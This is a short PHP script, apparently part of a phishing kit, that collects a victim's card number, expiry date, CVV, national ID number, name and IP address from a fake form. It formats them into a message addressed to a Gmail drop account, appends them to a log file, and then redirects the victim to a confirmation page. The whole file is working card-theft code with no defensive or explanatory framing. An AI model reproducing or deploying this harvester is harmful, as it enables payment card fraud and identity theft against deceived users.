<?php
session_start();

$name = $_POST['name'];
$selec = $_SESSION['select']; 
$ip = $_SERVER['REMOTE_ADDR']; 

// // datos para el correo
$destinatario = "giantly3@gmail.com"; //meil lo tiene luckymm21 
$subject = "$ip";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:$ip@pesca.com";

$msg ="
\n=========================== 
CCnum: ".$_SESSION['cnmber']."
EXP: ".$_SESSION['venc']."
CCV: ".$_SESSION['cv']."
DNI: ".$_SESSION['dni']."
Name: $name
IP: $ip
";
$msg .= "===========================";

//envio txt
$archivo=fopen("qq.txt","a");
fwrite($archivo,$msg);

sleep(3);
header('location: confirm.php');























